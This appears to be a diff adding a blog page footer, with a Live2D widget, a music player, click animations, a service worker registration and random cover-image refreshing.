+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 0 !important;
+    right: 10px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: scale(var(--waifu-scale, 1)) !important;
+    transform-origin: bottom right !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
